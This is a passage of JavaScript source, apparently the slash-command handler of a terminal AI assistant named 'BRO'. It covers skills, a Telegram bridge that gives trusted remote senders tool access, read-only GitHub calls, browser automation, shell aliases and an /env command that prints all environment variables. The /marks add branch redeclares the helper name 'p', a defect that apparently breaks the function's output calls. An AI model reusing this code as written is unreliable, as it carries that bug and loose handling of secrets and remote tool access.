        customSkills.forEach(function(s) { s.enabled = selectedIds.has(s.id); });
        saveSkills();
        saveCustomSkills();
        var onCount = combined.filter(function(s) { return s.enabled; }).length;
        console.log(p("green", "  \u2714 " + onCount + "/" + combined.length + " skills active\n"));
      } else {
        console.log(p("dim", "  Cancelled.\n"));
      }
      return;}
    if(input.startsWith("/skills toggle ")){var sid=input.substring(15).trim();var sk=skills.find(function(s){return s.id===sid;})||customSkills.find(function(s){return s.id===sid;});if(sk){sk.enabled=!sk.enabled;saveSkills();saveCustomSkills();console.log(p(sk.enabled?"green":"red","  "+sk.name+": "+(sk.enabled?"ON":"OFF")+"\n"));}else console.log(p("red","  Unknown: "+sid+"\n"));return;}
    if(input==="/skills level"){
      rl.pause();
      var sk = await interactiveSelect(skills, {
        title: "\u{1F4CA} SELECT SKILL TO LEVEL",
        multi: false
      });
      rl.resume();
      if(sk){
        var levels = [
          {name: "\u2588\u2591\u2591 Level 1 â€” Basic", level: 1, desc: "Beginner proficiency"},
          {name: "\u2588\u2588\u2591 Level 2 â€” Intermediate", level: 2, desc: "Working knowledge"},
          {name: "\u2588\u2588\u2588 Level 3 â€” Expert", level: 3, desc: "Full proficiency"}
        ];
        rl.pause();
        var lv = await interactiveSelect(levels, {
          title: "SET LEVEL FOR: " + sk.name,
          multi: false
        });
        rl.resume();
        if(lv){
          sk.level = lv.level;
          saveSkills();
          console.log(p("green", "  " + sk.name + " -> Level " + lv.level + "\n"));
        }
      }
      return;}
    if(input.startsWith("/skills level ")){var parts=input.substring(14).trim().split(" ");var sk=skills.find(function(s){return s.id===parts[0];});if(sk){sk.level=Math.max(1,Math.min(3,parseInt(parts[1])||1));saveSkills();console.log(p("green","  "+sk.name+": level "+sk.level+"\n"));}return;}
    if(input==="/skills reset"){skills=JSON.parse(JSON.stringify(defaultSkills));saveSkills();console.log(p("green","  Reset.\n"));return;}
    if(input==="/dream"||input==="/dreams"){showDreamTree();return;}
    if(input==="/dream now"){await dreamCycle(false);if(!dreams.entries.length)console.log(p("dim","  No triggers. BRO is chill.\n"));return;}
    if(input.startsWith("/dream resolve ")){var did=input.substring(15).trim();var dr=dreams.entries.find(function(d){return d.id===did;});if(dr){dr.resolved=true;saveDreams();console.log(p("green","  Resolved: "+dr.title+"\n"));}else console.log(p("red","  Not found.\n"));return;}
    if(input==="/dream clear"){dreams.entries=[];saveDreams();console.log(p("green","  Dreams cleared.\n"));return;}
    if(input==="/k1"||input==="/K1"){showK1();return;}
    if(input.startsWith("/k1 ")||input.startsWith("/K1 ")){await execK1(input.substring(4));return;}
    if(cmd==="cd"){try{process.chdir(resolve(input.split(" ").slice(1).join(" ").trim()||homedir()));console.log(p("green","-> "+process.cwd()));}catch(e){console.log(p("red",e.message));}return;}
    if(cmd==="pwd"){console.log(process.cwd());return;}
    if(cmd==="ls"){console.log(TOOLS.list(input.split(" ").slice(1).join(" ")||"."));return;}
    if(cmd==="tree"){showTree(input.split(" ").slice(1).join(" ")||".");console.log("");return;}
    if(cmd==="clear"){wr(CLR);return;}
    if(cmd==="history"){hist.slice(-20).forEach(function(h){console.log(p("dim",new Date(h.t).toLocaleTimeString())+" "+h.q);});return;}
    if(input==="/tg keyboard"||input==="/tg buttons"){await tgKeyboardCmd();return;}
    if(input==="/telegram"||input==="/tg"){
      var G4=rgb(255,215,0);var R4=RST;var B4=BOLD;var C4=CL.cyan;var D4=CL.dim;
      console.log("\n  "+G4+B4+"\u{1F4F1} TELEGRAM BRIDGE"+R4);
      console.log(D4+"  Talk to BRO from your phone\n"+R4);
      console.log(C4+"    /tg setup TOKEN CHATID  "+D4+"configure bot"+R4);
      console.log(C4+"    /tg on                  "+D4+"start bridge"+R4);
      console.log(C4+"    /tg off                 "+D4+"stop bridge"+R4);
      console.log(C4+"    /tg status              "+D4+"connection status"+R4);
      console.log(C4+"    /tg send MSG            "+D4+"send message to phone"+R4);
      console.log(C4+"    /tg test                "+D4+"test connection"+R4);
      console.log(C4+"    /tg groups              "+D4+"list known groups"+R4);
      console.log(C4+"    /tg approve ID          "+D4+"allow broadcasts to a group"+R4);
      console.log(C4+"    /tg unapprove ID        "+D4+"revoke a group"+R4);
      console.log(C4+"    /tg broadcast MSG       "+D4+"message all approved groups"+R4);
      console.log(C4+"    /tg trust ID            "+D4+"let a bot/user talk to BRO in approved groups"+R4);
      console.log(C4+"    /tg trusted             "+D4+"list trusted senders\n"+R4);
      console.log(D4+"  Status: "+(tgConfig.enabled?p("green","CONNECTED"):p("red","OFF"))+(tgConfig.botToken?" Token: ..."+tgConfig.botToken.substring(tgConfig.botToken.length-6):" No token")+R4);
      console.log(D4+"\n  SETUP:");
      console.log(D4+"  1. Message @BotFather on Telegram");
      console.log(D4+"  2. /newbot -> name it -> get token");
      console.log(D4+"  3. Message your new bot (say hi)");
      console.log(D4+"  4. /tg setup YOUR_TOKEN auto");
      console.log(D4+"     (auto-detects your chat ID)\n"+R4);
      return;}
    if(input.startsWith("/tg setup ")){
      var parts=input.substring(10).trim().split(" ");
      var token=parts[0];
      if(!token){console.log(p("red","  Need: /tg setup TOKEN CHATID\n"));return;}
      tgConfig.botToken=token;
      
      if(parts[1]==="auto"){
        // Auto-detect chat ID from recent messages
        spin("detecting chat ID");
        try{
          var r=await fetch("https://api.telegram.org/bot"+token+"/getUpdates");
          var d=await r.json();
          unspin();
          if(d.ok&&d.result&&d.result.length){
            var chatId=String(d.result[d.result.length-1].message.chat.id);
            tgConfig.chatId=chatId;
            saveTgConfig();
            console.log(p("green","  \u2714 Token saved. Chat ID: "+chatId));
            console.log(p("dim","  Run /tg on to connect\n"));
          } else {
            unspin();
            console.log(p("yellow","  Token saved but no messages found."));
            console.log(p("dim","  Send a message to your bot first, then run /tg setup TOKEN auto again\n"));
            saveTgConfig();
          }
        }catch(e){unspin();console.log(p("red","  Error: "+e.message+"\n"));}
      } else {
        tgConfig.chatId=parts[1]||"";
        saveTgConfig();
        console.log(p("green","  \u2714 Saved. /tg on to connect\n"));
      }
      return;}
    if(input==="/tg on"){
      if(!tgConfig.botToken||!tgConfig.chatId){console.log(p("red","  Setup first: /tg setup TOKEN CHATID\n"));return;}
      startTelegram();
      console.log(p("green","  \u{1F4F1} Telegram bridge ON\n"));
      return;}
    if(input==="/tg off"){stopTelegram();console.log(p("red","  \u{1F4F1} Telegram bridge OFF\n"));return;}
    if(input==="/tg status"){
      console.log("\n  "+p("cyan","Bridge: ")+(tgConfig.enabled?p("green","ON"):p("red","OFF")));
      console.log(p("cyan","  Token:  ")+(tgConfig.botToken?"..."+tgConfig.botToken.substring(tgConfig.botToken.length-8):p("red","none")));
      console.log(p("cyan","  Chat:   ")+(tgConfig.chatId||p("red","none")));
      console.log(p("cyan","  Poll:   ")+tgConfig.pollInterval+"ms");
      console.log(p("cyan","  Notify: ")+(tgConfig.notifications?p("green","ON"):p("red","OFF"))+"\n");
      return;}
    if(input.startsWith("/tg send ")){
      var msg=input.substring(9).trim();
      spin("sending");
      var ok=await tgSend(msg);
      unspin();
      console.log(ok?p("green","  Sent.\n"):p("red","  Failed. Check /tg status\n"));
      return;}
    if(input==="/tg test"){
      spin("testing");
      var ok=await tgSend("\u{1F91D} BRO test â€” connection working! " + new Date().toLocaleTimeString());
      unspin();
      console.log(ok?p("green","  \u2714 Test sent! Check Telegram.\n"):p("red","  \u2718 Failed. Check token + chat ID.\n"));
      return;}
    if(input==="/tg approve"){console.log(p("red","  Need: /tg approve ID  (see /tg groups for IDs)\n"));return;}
    if(input==="/tg unapprove"){console.log(p("red","  Need: /tg unapprove ID  (see /tg groups for IDs)\n"));return;}
    if(input==="/tg broadcast"){console.log(p("red","  Need: /tg broadcast MESSAGE\n"));return;}
    if(input==="/tg trust"){console.log(p("red","  Need: /tg trust USERNAME_or_ID\n"));return;}
    if(input==="/tg untrust"){console.log(p("red","  Need: /tg untrust USERNAME_or_ID\n"));return;}
    if(input==="/tg groups"){
      var gl=Object.values(tgGroups);
      console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F4F1} KNOWN TELEGRAM GROUPS"+RST);
      if(!gl.length){console.log(p("dim","  None discovered yet. BRO registers a group the moment it's added to it or sees activity there.\n"));return;}
      gl.sort(function(a,b){return b.lastSeen-a.lastSeen;}).forEach(function(g){
        console.log("  "+(g.approved?p("green","\u2714 approved  "):p("yellow","\u23F8 pending   "))+p("cyan",g.title)+p("dim","  ["+g.type+"]  id:"+g.id));
      });
      console.log(p("dim","\n  /tg approve ID    allow broadcasts to a group"));
      console.log(p("dim","  /tg unapprove ID  revoke\n"));
      return;}
    if(input.startsWith("/tg approve ")){
      var gid=input.substring(12).trim();
      if(!tgGroups[gid]){console.log(p("red","  Unknown group id. See /tg groups.\n"));return;}
      tgGroups[gid].approved=true;saveTgGroups();
      console.log(p("green","  \u2714 Approved \""+tgGroups[gid].title+"\" for broadcasts.\n"));
      return;}
    if(input.startsWith("/tg unapprove ")){
      var gid2=input.substring(14).trim();
      if(!tgGroups[gid2]){console.log(p("red","  Unknown group id. See /tg groups.\n"));return;}
      tgGroups[gid2].approved=false;saveTgGroups();
      console.log(p("yellow","  Revoked \""+tgGroups[gid2].title+"\".\n"));
      return;}
    if(input.startsWith("/tg broadcast ")){
      var bmsg=input.substring(14).trim();
      if(!bmsg){console.log(p("red","  Need: /tg broadcast MESSAGE\n"));return;}
      spin("broadcasting");
      var bres=await tgBroadcast(bmsg);
      unspin();
      if(!bres.sent.length&&!bres.failed.length){console.log(p("yellow","  No approved groups. See /tg groups.\n"));return;}
      if(bres.sent.length)console.log(p("green","  \u2714 Sent to: "+bres.sent.join(", ")));
      if(bres.failed.length)console.log(p("red","  \u2718 Failed: "+bres.failed.join(", ")));
      console.log("");
      return;}
    if(input.startsWith("/tg trust ")){
      var tsid=input.substring(10).trim().replace(/^@/,"");
      if(!tsid){console.log(p("red","  Need: /tg trust USERNAME_or_ID\n"));return;}
      if(!tgConfig.trustedSenders.includes(tsid)){tgConfig.trustedSenders.push(tsid);saveTgConfig();}
      console.log(p("green","  \u2714 Trusting \""+tsid+"\" in any approved group.\n"));
      return;}
    if(input.startsWith("/tg untrust ")){
      var utsid=input.substring(12).trim().replace(/^@/,"");
      tgConfig.trustedSenders=tgConfig.trustedSenders.filter(function(t){return t!==utsid;});
      saveTgConfig();
      console.log(p("yellow","  Untrusted \""+utsid+"\".\n"));
      return;}
    if(input==="/tg trusted"){
      console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F91D} TRUSTED SENDERS"+RST);
      if(!tgConfig.trustedSenders.length){console.log(p("dim","  None yet. /tg trust USERNAME_or_ID to add one (e.g. ESMA's bot username).\n"));return;}
      tgConfig.trustedSenders.forEach(function(t){console.log("  "+p("cyan",t));});
      console.log(p("dim","\n  These get a conversational AI reply (with tool access) when they post in any APPROVED group. Nobody else does.\n"));
      return;}
    if(input==="/gh"){
      console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F419} GITHUB"+RST);
      console.log(p("dim","  Read-only: repo info, PRs, issues, CI checks, file contents\n"));
      console.log(p("cyan","    /gh default OWNER/REPO ")+p("dim","set a default repo"));
      console.log(p("cyan","    /gh repo [OWNER/REPO]  ")+p("dim","repo info"));
      console.log(p("cyan","    /gh prs [OWNER/REPO]   ")+p("dim","open PRs"));
      console.log(p("cyan","    /gh issues [OWNER/REPO]")+p("dim","open issues"));
      console.log(p("cyan","    /gh checks [OWNER/REPO]")+p("dim","latest CI checks"));
      console.log(p("cyan","    /gh file OWNER/REPO PATH")+p("dim","read a file"));
      console.log(p("dim","\n  Token: ")+(GITHUB_TOKEN?p("green","set"):p("red","not set (public repos only, low rate limit)"))+p("dim","  Default repo: ")+(ghConfig.defaultRepo||p("dim","none"))+"\n");
      return;}
    if(input.startsWith("/gh default ")){
      var ghd=input.substring(12).trim();
      if(!/^[\w.-]+\/[\w.-]+$/.test(ghd)){console.log(p("red","  Expected OWNER/REPO\n"));return;}
      ghConfig.defaultRepo=ghd;saveGhConfig();
      console.log(p("green","  \u2714 Default repo set to "+ghd+"\n"));
      return;}
    if(input==="/gh repo"||input.startsWith("/gh repo ")){
      spin("checking repo", "search");
      try{
        var ghr=await ghRepoInfo(input.length>8?input.substring(9).trim():"");
        unspin();
        console.log("\n  "+rgb(255,215,0)+BOLD+ghr.full_name+RST+(ghr.private?p("dim"," (private)"):""));
        console.log(p("cyan","  ")+(ghr.description||p("dim","(no description)")));
        console.log(p("cyan","  \u2B50 ")+ghr.stars+p("dim","  \u{1F374} forks: ")+ghr.forks+p("dim","  issues: ")+ghr.open_issues);
        console.log(p("dim","  branch: ")+ghr.default_branch+p("dim","  last push: ")+timeAgo(new Date(ghr.pushed_at).getTime()));
        console.log(p("dim","  "+ghr.html_url+"\n"));
      }catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}
      return;}
    if(input==="/gh prs"||input.startsWith("/gh prs ")){
      spin("checking PRs", "search");
      try{
        var ghprs=await ghPRs(input.length>7?input.substring(8).trim():"");
        unspin();
        console.log("\n  "+rgb(255,215,0)+BOLD+"OPEN PULL REQUESTS"+RST);
        if(!ghprs.length){console.log(p("dim","  None open.\n"));return;}
        ghprs.forEach(function(pr){console.log("  "+p("cyan","#"+pr.number)+" "+(pr.draft?p("dim","[draft] "):"")+pr.title+p("dim"," by "+pr.user+", "+timeAgo(new Date(pr.updated_at).getTime())));});
        console.log("");
      }catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}
      return;}
    if(input==="/gh issues"||input.startsWith("/gh issues ")){
      spin("checking issues", "search");
      try{
        var ghis=await ghIssues(input.length>10?input.substring(11).trim():"");
        unspin();
        console.log("\n  "+rgb(255,215,0)+BOLD+"OPEN ISSUES"+RST);
        if(!ghis.length){console.log(p("dim","  None open.\n"));return;}
        ghis.forEach(function(is){console.log("  "+p("cyan","#"+is.number)+" "+is.title+p("dim"," by "+is.user+", "+timeAgo(new Date(is.updated_at).getTime())));});
        console.log("");
      }catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}
      return;}
    if(input==="/gh checks"||input.startsWith("/gh checks ")){
      spin("checking CI", "search");
      try{
        var ghck=await ghChecks(input.length>10?input.substring(11).trim():"");
        unspin();
        console.log("\n  "+rgb(255,215,0)+BOLD+"CI CHECKS"+RST);
        if(!ghck.length){console.log(p("dim","  No check runs found on the default branch.\n"));return;}
        ghck.forEach(function(c){
          var icon=c.conclusion==="success"?p("green","\u2714"):c.conclusion==="failure"?p("red","\u2718"):p("yellow","\u25CB");
          console.log("  "+icon+" "+c.name+p("dim","  "+(c.conclusion||c.status)));
        });
        console.log("");
      }catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}
      return;}
    if(input.startsWith("/gh file ")){
      var ghfArgs=input.substring(9).trim().split(" ");
      if(ghfArgs.length<2){console.log(p("red","  Need: /gh file OWNER/REPO PATH\n"));return;}
      spin("reading file", "search");
      try{
        var ghfc=await ghFile(ghfArgs[0], ghfArgs.slice(1).join(" "));
        unspin();
        console.log("\n"+ghfc.substring(0,4000)+(ghfc.length>4000?p("dim","\n  ...truncated ("+ghfc.length+" chars total)"):"")+"\n");
      }catch(e){unspin();console.log(p("red","  "+e.message+"\n"));}
      return;}
    if(input==="/web"){
      try{ var ws = await TOOLS.web_status(); console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F30D} WEB BROWSER"+RST+"\n"); console.log(p("cyan","  "+ws.replace(/\n/g,"\n  "))+"\n"); }catch(e){ console.log(p("red","x "+e.message)); } return; }
    if(input.startsWith("/web open ")){
      spin("opening page", "search");
      try{ var wo = await TOOLS.web_open(input.substring(10)); unspin(); console.log("\n"+wo+"\n"); }catch(e){ unspin(); console.log(p("red","x "+e.message)); }; return; }
    if(input.startsWith("/web search ")){
      spin("searching", "search");
      try{ var wsr = await TOOLS.web_search(input.substring(12)); unspin(); console.log("\n"+wsr+"\n"); }catch(e){ unspin(); console.log(p("red","x "+e.message)); }; return; }
    if(input==="/web text"){
      spin("reading page", "search");
      try{ var wt = await TOOLS.web_text(); unspin(); console.log("\n"+wt+"\n"); }catch(e){ unspin(); console.log(p("red","x "+e.message)); }; return; }
    if(input.startsWith("/web raw ")){
      spin("fetching", "search");
      try{ var wr = await TOOLS.web_raw(input.substring(9)); unspin(); console.log("\n"+wr+"\n"); }catch(e){ unspin(); console.log(p("red","x "+e.message)); }; return; }
    if(input.startsWith("/web click ")){
      spin("clicking", "search");
      try{ var wc = await TOOLS.web_click(input.substring(11)); unspin(); console.log("\n"+wc+"\n"); }catch(e){ unspin(); console.log(p("red","x "+e.message)); }; return; }
    if(input.startsWith("/web type ")){
      spin("typing", "search");
      try{ var wty = await TOOLS.web_type(input.substring(10)); unspin(); console.log("\n"+wty+"\n"); }catch(e){ unspin(); console.log(p("red","x "+e.message)); }; return; }
    if(input.startsWith("/web eval ")){
      spin("evaluating", "search");
      try{ var we = await TOOLS.web_eval(input.substring(10)); unspin(); console.log("\n"+we+"\n"); }catch(e){ unspin(); console.log(p("red","x "+e.message)); }; return; }
    if(input==="/web shot"){
      try{ var wsh = await TOOLS.web_screenshot(""); console.log(p("green","\n  "+wsh+"\n")); }catch(e){ console.log(p("red","x "+e.message)); } return; }
    if(input==="/bromance"||input==="/bro"){
      console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F339} BROMANCE"+RST);
      console.log(p("dim","  Skill connector + endpoint search\n"));
      console.log(p("cyan","    /bromance search Q  ")+p("dim","search registries"));
      console.log(p("cyan","    /bromance discover Q")+p("dim","live web search"));
      console.log(p("cyan","    /bromance browse T  ")+p("dim","mcp llm api tunnel agent"));
      console.log(p("cyan","    /bromance install ID")+p("dim","install skill"));
      console.log(p("cyan","    /bromance remove ID ")+p("dim","uninstall"));
      console.log(p("cyan","    /bromance list      ")+p("dim","bro-ficiencies"));
      console.log(p("cyan","    /bromance pick      ")+p("dim","interactive installer"));
      console.log(p("cyan","    /brofile            ")+p("dim","project DNA"));
      console.log(p("cyan","    /chain              ")+p("dim","build chain"));
      console.log("");return;}
    if(input==="/bromance pick"&&BR.bromanceSearch){
      // Flatten all registries into one list
      var allItems = [];
      Object.keys(BR.REGISTRIES).forEach(function(type){
        BR.REGISTRIES[type].forEach(function(item){
          var installed = BR.broficiencies.installed.some(function(s){return s.id===item.id;});
          allItems.push({
            id: item.id,
            name: (installed?"\u2714 ":"  ") + item.name,
            icon: item.type==="mcp"?"\u{1F9E9}":item.type==="llm"?"\u{1F9E0}":item.type==="api"?"\u{1F310}":item.type==="tunnel"?"\u{1F310}":"\u{1F916}",
            desc: "["+item.type.toUpperCase()+"] "+item.desc,
            _item: item,
            _installed: installed
          });
        });
      });
      
      // Pre-select installed ones
      var preSel = [];
      allItems.forEach(function(a, i){ if(a._installed) preSel.push(i); });
      
      rl.pause();
      var picked = await interactiveSelect(allItems, {
        title: "\u{1F339} BROMANCE â€” pick your bro-ficiencies",
        multi: true,
        preSelected: preSel
      });
      rl.resume();
      
      if(picked !== null){
        var pickedIds = new Set(picked.map(function(p2){return p2.id;}));
        // Install new picks
        picked.forEach(function(p2){
          if(!p2._installed) BR.installSkill(p2._item, {});
        });
        // Uninstall deselected
        BR.broficiencies.installed.forEach(function(s){
          if(!pickedIds.has(s.id)) BR.uninstallSkill(s.id);
        });
        console.log(p("green","  \u{1F339} "+picked.length+" bro-ficiencies active\n"));
      }
      return;}
        if(input.startsWith("/bromance search ")&&BR.bromanceSearch){
      var bq=input.substring(17);var bres=BR.bromanceSearch(bq);
      console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F339} "+bq+RST+"\n");
      if(!bres.length){console.log(p("dim","  No results\n"));return;}
      bres.slice(0,15).forEach(function(br){
        var btc=br.type==="mcp"?p("magenta","MCP"):br.type==="llm"?p("cyan","LLM"):br.type==="api"?p("green","API"):br.type==="tunnel"?p("yellow","TUN"):p("blue","AGT");
        console.log("  "+btc+" "+p("cyan",br.name.padEnd(22))+p("dim",br.desc.substring(0,50)));
        console.log("       "+p("dim","/bromance install "+br.id));
      });console.log("");return;}
    if(input.startsWith("/bromance discover ")&&BR.bromanceLiveSearch){
      var bdq=input.substring(19);
      var TAVILY_KEY=process.env.TAVILY_API_KEY||"";
      if(!TAVILY_KEY){console.log(p("red","  Missing TAVILY_API_KEY environment variable.\n"));return;}
      spin("\u{1F339} searching", "search");
      var bdr=await BR.bromanceLiveSearch(bdq,TAVILY_KEY);unspin();
      if(!bdr.length){console.log(p("dim","  No results\n"));return;}
      console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F339} Discovered"+RST+"\n");
      bdr.forEach(function(br){console.log("  "+p("cyan",br.name));console.log("  "+p("dim",br.desc));console.log("  "+p("blue",br.url)+"\n");});
      return;}
    if(input.startsWith("/bromance install ")&&BR.installSkill){
      var bid=input.substring(18).trim();var bfound=null;
      Object.keys(BR.REGISTRIES).forEach(function(bt){BR.REGISTRIES[bt].forEach(function(bi){if(bi.id===bid)bfound=bi;});});
      if(!bfound){console.log(p("red","  Not found\n"));return;}
      var bsk=BR.installSkill(bfound,{});
      console.log(p("green","  \u{1F339} Installed: "+bsk.name)+"\n");return;}
    if(input.startsWith("/bromance remove ")&&BR.uninstallSkill){BR.uninstallSkill(input.substring(17).trim());console.log(p("green","  Removed.\n"));return;}
    if(input==="/bromance list"&&BR.broficiencies){
      console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F339} BRO-FICIENCIES"+RST+"\n");
      if(!BR.broficiencies.installed.length){console.log(p("dim","  None yet. /bromance search\n"));return;}
      BR.broficiencies.installed.forEach(function(bs){
        console.log("  "+(bs.active?p("green","ON "):p("red","OFF"))+" "+p("cyan",bs.name.padEnd(22))+p("dim",bs.type));
      });console.log("");return;}
    if(input.startsWith("/bromance browse ")&&BR.REGISTRIES){
      var bbt=input.substring(17).trim();var bbi=BR.REGISTRIES[bbt];
      if(!bbi){console.log(p("dim","  Types: mcp llm api tunnel agent\n"));return;}
      console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F339} "+bbt.toUpperCase()+RST+"\n");
      bbi.forEach(function(bi){
        console.log("  "+p("cyan",bi.name.padEnd(22))+p("dim",bi.desc.substring(0,50)));
        console.log("    "+p("dim","id: "+bi.id+(bi.needs?" needs: "+bi.needs:"")));
      });console.log("");return;}
    if(input==="/brofile"&&BR.generateBrofile){
      var bex=BR.loadBrofile(process.cwd());
      if(!bex){bex=BR.generateBrofile(process.cwd());BR.saveBrofile(process.cwd(),bex);console.log(p("green","\n  .brofile generated!\n"));}
      else{console.log("\n  "+rgb(255,215,0)+BOLD+".brofile"+RST+"\n");}
      console.log(p("yellow",JSON.stringify(bex,null,2))+"\n");return;}
    if(input==="/brofile new"&&BR.generateBrofile){
      var bnf=BR.generateBrofile(process.cwd());BR.saveBrofile(process.cwd(),bnf);
      console.log(p("green","\n  Regenerated!\n"));console.log(p("yellow",JSON.stringify(bnf,null,2))+"\n");return;}
    if(input==="/chain"&&BR.chain){
      var bch=BR.chain;console.log("\n  "+rgb(255,215,0)+BOLD+"BUILD CHAIN"+RST);
      console.log(p("cyan","  Blocks: ")+bch.blocks.length);
      console.log(p("cyan","  Streak: ")+bch.streak+" "+"\u{1F525}".repeat(Math.min(bch.streak,10)));
      console.log(p("cyan","  Craft:  ")+bch.craftScore);
      if(bch.blocks.length){console.log(p("dim","\n  Recent:"));
        bch.blocks.slice(-5).forEach(function(bb){
          console.log("  "+p("dim","#"+bb.id)+" "+p("cyan",bb.date)+" "+p("yellow",(bb.summary||"").substring(0,50))+" "+p("dim","["+bb.hash.substring(0,8)+"]"));
        });}console.log("");return;}
    if(input==="/brotime"){
      console.log("\n  "+rgb(255,215,0)+BOLD+"\u23F1\uFE0F  SESSION RECAP"+RST);
      if(!lastSessionInfo){
        console.log(p("dim","  No other window's session found.\n"));
      } else {
        console.log(p("cyan","  Most recent other window ended: ")+timeAgo(lastSessionInfo.endedAt)+p("dim"," ("+lastSessionInfo.turnCount+" turns, not loaded here)"));
      }
      console.log(p("cyan","  This window's turns: ")+chatLog.length);
      console.log(p("cyan","  Memorized facts: ")+memory.facts.length+p("dim",", observations: ")+memory.observations.length+p("dim"," (shared across all windows)"));
      if(memory.observations.length){
        console.log(p("dim","\n  Recent:"));
        memory.observations.slice(-5).forEach(function(o){console.log("  "+p("dim",timeAgo(o.time)+" - ")+o.text.substring(0,80));});
      }
      console.log("");
      return;}
    if(input==="/sys"){var os2=require("os");console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4BB} SYSTEM"+RST);console.log(p("cyan","  Platform:  ")+os2.platform()+" "+os2.arch());console.log(p("cyan","  Hostname:  ")+os2.hostname());console.log(p("cyan","  CPUs:      ")+os2.cpus().length+" @ "+os2.cpus()[0].model);console.log(p("cyan","  Memory:    ")+Math.round(os2.totalmem()/1073741824)+"GB total, "+Math.round(os2.freemem()/1073741824)+"GB free");console.log(p("cyan","  Node:      ")+process.version);console.log(p("cyan","  PID:       ")+process.pid);console.log(p("cyan","  Uptime:    ")+Math.floor(process.uptime()/60)+"m");console.log(p("cyan","  Home:      ")+homedir());console.log(p("cyan","  CWD:       ")+process.cwd()+"\n");return;}
    if(input==="/calc"){console.log(p("yellow","\n  \u{1F522} Usage: /calc 2+2*3\n"));return;}
    if(input.startsWith("/calc ")){var ec=input.substring(6).trim();console.log("\n  "+p("cyan",ec)+" = "+p("yellow",calcExpr(ec))+"\n");return;}
    if(input==="/marks"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F4CD} BOOKMARKS"+RST);var bks=Object.keys(bookmarks);if(!bks.length){console.log(p("dim","  None yet. /marks add NAME ./path\n"));return;}bks.forEach(function(k){console.log("  "+p("cyan",k.padEnd(16))+p("dim","-> ")+bookmarks[k]);});console.log("");return;}
    if(input.startsWith("/marks add ")){var p=input.substring(11).trim().split(" ");if(p.length<2){console.log(p("red","  Usage: /marks add NAME path\n"));return;}bookmarks[p[0]]=resolve(p.slice(1).join(" "));saveBookmarks();console.log(p("green","  \u2714 "+p[0]+" -> "+bookmarks[p[0]]+"\n"));return;}
    if(input.startsWith("/marks del ")){var mk=input.substring(11).trim();if(!bookmarks[mk]){console.log(p("red","  Not found: "+mk+"\n"));return;}delete bookmarks[mk];saveBookmarks();console.log(p("green","  \u2714 Deleted "+mk+"\n"));return;}
    if(input.startsWith("/marks go ")){var mg=input.substring(10).trim();if(!bookmarks[mg]){console.log(p("red","  Not found: "+mg+"\n"));return;}try{process.chdir(bookmarks[mg]);console.log(p("green","-> "+process.cwd()+"\n"));}catch(e){console.log(p("red",e.message+"\n"));}return;}
    if(input==="/alias"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F516} ALIASES"+RST);var ak=Object.keys(aliases);if(!ak.length){console.log(p("dim","  None yet. /alias add NAME '/cmd args'\n"));return;}ak.forEach(function(k){console.log("  "+p("cyan",k.padEnd(14))+p("dim","-> ")+aliases[k]);});console.log("");return;}
    if(input.startsWith("/alias add ")){var ap=input.substring(11).trim();var asp=ap.indexOf(" ");if(asp===-1){console.log(p("red","  Usage: /alias add NAME command\n"));return;}var an=ap.substring(0,asp),ac=ap.substring(asp+1);aliases[an]=ac;saveAliases();console.log(p("green","  \u2714 "+an+" -> "+ac+"\n"));return;}
    if(input.startsWith("/alias del ")){var ad=input.substring(11).trim();if(!aliases[ad]){console.log(p("red","  Not found: "+ad+"\n"));return;}delete aliases[ad];saveAliases();console.log(p("green","  \u2714 Deleted "+ad+"\n"));return;}
    if(input==="/env"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{1F30D} ENVIRONMENT"+RST);Object.keys(process.env).sort().forEach(function(k){console.log("  "+p("cyan",k.padEnd(24))+p("dim",(process.env[k]||"").substring(0,60)));});console.log("");return;}
    if(input.startsWith("/env set ")){var ep=input.substring(9).trim();var eq2=ep.indexOf("=");if(eq2===-1){console.log(p("red","  Usage: /env set KEY=VALUE\n"));return;}var ek=ep.substring(0,eq2).trim(),ev=ep.substring(eq2+1).trim();process.env[ek]=ev;console.log(p("green","  \u2714 "+ek+"="+ev.substring(0,40)+"\n"));return;}
    if(input==="/pomo"){console.log("\n"+rgb(255,215,0)+BOLD+"  \u{23F3} POMODORO"+RST);console.log(p("dim","  /pomo 25  - 25min focus session"));console.log(p("dim","  /pomo 50  - 50min deep work"));console.log(p("dim","  /pomo stop - cancel"));console.log(p("dim","  /pomo     - this menu\n"));if(pomoActive)console.log(p("cyan","  Active: ")+formatDuration(pomoRemaining)+" remaining\n");return;}
    if(input.startsWith("/pomo ")){var pt=input.substring(6).trim();if(pt==="stop"){if(pomoActive){stopPomodoro();console.log(p("yellow","  \u23F9 Cancelled.\n"));}else{console.log(p("dim","  No timer running.\n"));}return;}var pm=parseInt(pt);if(isNaN(pm)||pm<1||pm>180){console.log(p("red","  Use 1-180 minutes.\n"));return;}startPomodoro(pm);return;}
    if(aliases[cmd]){input=input.substring(input.indexOf(" ")+1||input.length);var acmd=aliases[cmd];if(acmd.startsWith("/"))return handleInput(acmd+(input?" "+input:""));else{console.log(TOOLS.exec(acmd+(input?" "+input:"")));return;}}
    if(input==="/diff"){console.log(p("cyan","\n  Diff:"));console.log(TOOLS.exec("git diff --stat"));console.log("\n"+TOOLS.exec("git diff").substring(0,5000)+"\n");return;}
    if(input.startsWith("/history search ")){var hq=input.substring(16).trim().toLowerCase();var hh=hist.filter(function(h){return h.q.toLowerCase().indexOf(hq)>=0;});console.log("\n  "+rgb(255,215,0)+BOLD+"\u{1F50D} HISTORY: "+hq+RST);if(!hh.length)console.log(p("dim","  No matches.\n"));else hh.slice(-20).forEach(function(h){console.log(p("dim",new Date(h.t).toLocaleTimeString())+" "+h.q);});console.log("");return;}
